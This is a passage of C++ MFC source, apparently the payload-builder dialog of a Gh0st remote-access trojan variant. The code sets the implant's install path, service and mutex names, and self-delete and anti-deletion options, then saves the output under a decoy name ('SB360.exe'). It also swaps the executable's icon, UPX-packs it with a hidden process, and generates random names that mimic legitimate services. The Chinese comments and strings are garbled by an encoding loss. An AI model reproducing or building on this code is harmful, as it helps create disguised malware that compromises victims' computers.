	strcpy(m_ServiceInfo.ReleasePath,m_remote_path.GetBuffer(0));   //д�밲װ·��
	strcpy(m_ServiceInfo.ReleaseName,m_dllname.GetBuffer(0));   //д�밲װ����
	strcpy(m_ServiceInfo.Mexi,m_exemeux.GetBuffer(0));          //д�����л���
	strcpy(m_ServiceInfo.szGroup,m_remote_name.GetBuffer(0));   //д�����߷���
    m_ServiceInfo.Dele_te = m_delrtd;  //��װ��ɾ��
	m_ServiceInfo.Dele_zc = m_zraz;    //ע���װ
	m_ServiceInfo.Dele_zd = m_azzd;    //��װ����
	m_ServiceInfo.Dele_fs = m_zkfsms;  //ռ�ӷ�ɾ��ģʽ��װ
	m_ServiceInfo.Dele_Kzj = m_zkfkzj;  //K�ս���ģʽ

	//�ж��Ƿ����
	WORD Tail = strlen(m_ServiceInfo.ReleasePath)-1;

	if(m_ServiceInfo.ReleasePath[Tail]!='\\')
	{
		strcat(m_ServiceInfo.ReleasePath,"\\");
		SetDlgItemText(IDC_COMBO_RELEASEPATH,m_ServiceInfo.ReleasePath);
	}

	//�ж��Ƿ��ж��Ŀ¼
	CHAR *Judge = strstr(m_ServiceInfo.ReleasePath,"\\");
	if(Judge)
	{
		Judge++;
		CHAR *Judge2= strstr(Judge,"\\");
		if(Judge2)
		{
			Judge2++;
			CHAR *Judge3=strstr(Judge2,"\\");
			if(Judge3)
			{
				MessageBox("Ŀ¼���Ϸ�!�Ҵ���Ŀ¼������!");
				return;
			}
		}
	}
 
	//������Ϣ 
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString("��������","InstallPath",m_remote_path);  //��װĿ¼

//	strcat(m_ServiceInfo.ReleasePath,m_dllname.GetBuffer(0));

	CFileDialog Point(FALSE, "exe", "SB360.exe", OFN_HIDEREADONLY |OFN_OVERWRITEPROMPT,"��ִ���ļ�|*.exe", NULL);
	Point.m_ofn.lpstrInitialDir = patht;
	if(Point.DoModal()==IDOK)
	{
		SavePath=Point.GetPathName();
	}
	else
	{
		SavePath.Empty();
		delete Point;
		return;
	}

	if (CreateServer(&m_ServiceInfo,&m_OnlineInfo,SavePath.GetBuffer(0))==FALSE)
	{
		MessageBox("���������ʧ��!");
		return;
	}

    //����ͼ��
	CString szIconPath;
	GetDlgItemText(IDC_ICO,szIconPath);
	if (szIconPath!="")
	{
		char Pathss[MAX_PATH];
		char Pathee[MAX_PATH];
	    sprintf(Pathss, "%s",szIconPath);
		sprintf(Pathee, "%s",SavePath);

	    CMyToolsKit Dig;
		Dig.ChangeExeIcon(Pathss,Pathee);
	}

	CString SCminc;
	if (m_upx)
	{
	    CompressUpx(Point.GetFileName());//UPXѹ��		
	    SCminc="�ļ�ѹ���ɹ�!";
	}
	else
	{
		SCminc="�ļ����ɳɹ�!";
	}

	CString szTempTips;
	szTempTips.Format("%s������...\r\n%s",SCminc,SavePath.GetBuffer(0));
	MessageBox(szTempTips,"��ʾ",MB_OK|MB_ICONINFORMATION);

    OnOK();

	delete Point;
}

void BuildServer::CompressUpx(CString inpath)
{
	HRSRC hResInfo;
	HGLOBAL hResData;
	DWORD dwSize,dwWritten;
	LPBYTE p;
	HANDLE hFile;
    // �����������Դ
	hResInfo = FindResource(NULL,MAKEINTRESOURCE(IDR_UPX),"UPX");
	if(hResInfo == NULL) return;
    // �����Դ�ߴ�
	dwSize = SizeofResource(NULL,hResInfo);
    // װ����Դ
	hResData = LoadResource(NULL,hResInfo);
	if(hResData == NULL) return;
	// Ϊ���ݷ���ռ�
	p = (LPBYTE)GlobalAlloc(GPTR, dwSize); 
	if (p == NULL)     return;
	// ������Դ����
	MoveMemory((LPVOID)p, (LPCVOID)LockResource(hResData), dwSize);
	
    char Path[256];
    GetCurrentDirectory(256, Path);
	strcat(Path,"\\upx.exe");
	DeleteFile(Path);
	hFile = CreateFile(Path,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	if(hFile == NULL) return;
	
	WriteFile(hFile,(LPVOID)p,dwSize,&dwWritten,NULL);
	CloseHandle(hFile);
	ShellExecute(this->m_hWnd,"open",Path, inpath,"",SW_HIDE);
	
	
	BOOL del;
	do 
	{
		del = DeleteFile(Path);
	} while(!del);
}

void BuildServer::OnExit() 
{
	// TODO: Add your control notification handler code here
	OnCancel();
}
void BuildServer::Onzraz() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_DELRTD)->EnableWindow(m_zraz);
	GetDlgItem(IDC_AZZD)->EnableWindow(m_zraz);
	GetDlgItem(IDC_ZKFSMS)->EnableWindow(m_zraz);
	GetDlgItem(IDC_GDTJ)->EnableWindow(m_zraz);

//	GetDlgItem(IDC_SERVICE_NAME)->EnableWindow(m_zraz);
	GetDlgItem(IDC_COMBO_RELEASEPATH)->EnableWindow(m_zraz);
	GetDlgItem(IDC_DLL_NAME)->EnableWindow(m_zraz);
}

void BuildServer::Ongdtj()
{
	UpdateData(true);
}
void BuildServer::Onmeux()
{
	UpdateData(true);
}

void BuildServer::OnLButtonDown(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CDialog::OnLButtonDown(nFlags, point);
}

void BuildServer::OnSelchangeRemoteHost() 
{
	// TODO: Add your control notification handler code here
}

void BuildServer::OnEditchangeRemoteHost() 
{
	// TODO: Add your control notification handler code here
}

void BuildServer::OnLButtonDblClk(UINT nFlags, CPoint point) 
{
	// TODO: Add your message handler code here and/or call default
	CDialog::OnLButtonDblClk(nFlags, point);
}

BOOL BuildServer::OnSetCursor(CWnd* pWnd, UINT nHitTest, UINT message) 
{
	// TODO: Add your message handler code here and/or call default
	return CDialog::OnSetCursor(pWnd, nHitTest, message);
}

BOOL BuildServer::IsFileExist(LPCTSTR strFileName)
{
	if(strFileName == NULL)
		return FALSE;
	
	DWORD dwAttr = ::GetFileAttributes(strFileName);
	return (dwAttr!=-1 && !(dwAttr&FILE_ATTRIBUTE_DIRECTORY) );
}

int StormRand(int count)
{
	unsigned long Time=GetTickCount();
	int seed=rand()+3;
	seed=(seed*Time)%count;
	return seed;
}

void my_stormRands(BOOL ds,CHAR Number,CHAR Data[],CHAR Low,CHAR High)
{
	CHAR str[2];
	if(ds)
		str[0]='a';
	else
		str[0]='A';

	for (int i=0;i<Number;i++)
	{
	    Sleep(StormRand(20));
		if(i==Low||i==High)
		{
			Data[i]=' ';
			i++;
			Data[i]=str[0]+StormRand(26);
			continue;
		}
		if(i==0)
		{
		    Data[i]='A'+StormRand(26);
		}
		else
		{
			Data[i]=str[0]+StormRand(26);
		}
	}
}

void BuildServer::OnRandom() 
{
	// TODO: Add your control notification handler code here
//m_gdtj

	    CHAR ServerName[30]={NULL};
	    ZeroMemory(ServerName,30);

		my_stormRands(TRUE,15,ServerName,6,15);  //Microsoft
	    ServerName[0]='R';
	    ServerName[1]='u';
	    SetDlgItemText(IDC_SERVICE_NAME,ServerName);

	if(m_zraz)
	{
		if(m_gdtj)  //���;��
		{
	        Sleep(50);  //��ʱ
	        CHAR ServerPath[30]={NULL};
	        ZeroMemory(ServerPath,30);

		    my_stormRands(TRUE,12,ServerPath,6,15);
	        ServerPath[0]='R';
	        ServerPath[1]='u';

	        m_releasepath.SetCurSel(1);
	        CString szShow;
	        GetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
	        szShow+=ServerPath;
	        SetDlgItemText(IDC_COMBO_RELEASEPATH,szShow);
		}

	    Sleep(50);  //��ʱ
	    CHAR szTemp[30]={NULL};
		my_stormRands(TRUE,7,szTemp,7,15);

	    CString	WJ_Name=szTemp;
	    SetDlgItemText(IDC_DLL_NAME,WJ_Name+".exe");   //�ļ���
	}

	if(m_meux)
	{
		Sleep(50);  //��ʱ
	    CHAR szMeux[50]={NULL};
		my_stormRands(TRUE,12,szMeux,6,15);
		SetDlgItemText(IDC_EXE_MEUX,szMeux);   //������
	}
//	SetDlgItemText(IDC_EXE_MEUX,WJ_Name);   //�ļ���

	Sleep(50);
	CTime time = CTime::GetCurrentTime(); ///����CTime���� 
	CString SVTime = time.Format("%Y%m%d");  //��ȡ��ǰ���� Ϊ����汾

    SVTime = SVTime.Right(6);  //��ȡ��6λ��
	SetDlgItemText(IDC_VERSION,"S_"+SVTime);   //����汾

	UpdateData(TRUE);
}	

void BuildServer::OnSelectIco() 
{
	// TODO: Add your control notification handler code here
	char Path[MAX_PATH];
	sprintf(Path, "%s\\ICOͼ��",patht);
	CFileDialog dlg(TRUE, "ico", NULL, OFN_READONLY,"icoͼ��|*.ico||", NULL);
	dlg.m_ofn.lpstrInitialDir = Path;

	dlg.m_ofn.lpstrTitle= "ѡ��ICO�ļ�";
	if(dlg.DoModal() != IDOK)
		return;
	SetDlgItemText(IDC_ICO,dlg.GetPathName());
	HICON hIcon=(HICON)LoadImage(NULL, dlg.GetPathName(),IMAGE_ICON, 32, 32,LR_LOADFROMFILE);
   	m_Ico.SetIcon(hIcon);
}

